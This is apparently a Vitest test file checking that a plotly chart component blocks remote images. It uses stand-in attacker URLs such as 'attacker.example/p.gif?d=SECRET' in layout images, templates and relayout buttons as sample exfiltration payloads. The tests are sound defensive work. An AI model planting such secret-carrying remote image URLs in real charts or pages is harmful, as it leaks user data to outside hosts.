// Copyright 2026 SecretoftheUniverse.com LLC. Licensed under the GNU Affero General Public License, version 3 only.
// SPDX-License-Identifier: AGPL-3.0-only

// The real plotly bundle, not ArtifactView.test's mock: what matters is the
// <image> elements plotly actually draws, each a fetch under the app's CSP.
import { render, waitFor } from "@testing-library/react";
import { expect, it } from "vitest";
import { ArtifactChart, inertLayout } from "./ArtifactView";

const DOT = "data:image/png;base64,iVBORw0KGgo=";
const image = (source: string) => ({ source, xref: "paper", yref: "paper", x: 0, y: 1, sizex: 0.1, sizey: 0.1 });

// One image per figure: jsdom never finishes loading an image, and plotly
// waits on each one before drawing the next.
const hrefsOf = async (layout: Record<string, unknown>) => {
  const { container, unmount } = render(<ArtifactChart figure={{ data: [{ type: "scatter", x: [1, 2], y: [1, 2] }], layout }} />);
  await waitFor(() => expect(container.querySelector(".main-svg")).not.toBeNull());
  const hrefs = [...container.querySelectorAll("image")].map((i) => i.getAttribute("href") ?? i.getAttribute("xlink:href"));
  unmount();
  return hrefs;
};

it.each([
  ["layout.images", { images: [image("https://attacker.example/p.gif?d=SECRET")] }],
  ["a named template image", { template: { layout: { images: [{ ...image("https://attacker.example/t.gif"), name: "logo" }] } } }],
])("a chart artifact never draws (so never fetches) a remote image from %s", async (_where, layout) => {
  expect(await hrefsOf(layout)).toEqual([]);
});

it("a chart artifact still draws a data: image", async () => {
  expect(await hrefsOf({ images: [image(DOT)] })).toEqual([DOT]);
});

it("drops updatemenus and sliders, whose buttons can relayout a remote image in", () => {
  const menus = [{ buttons: [{ method: "relayout", args: [{ images: [image("https://attacker.example/c.gif")] }] }] }];
  const out = inertLayout({ title: "t", updatemenus: menus, sliders: menus, template: { layout: { updatemenus: menus, font: { size: 9 } } } });
  expect(out).toEqual({ title: "t", template: { layout: { font: { size: 9 } } } });
});
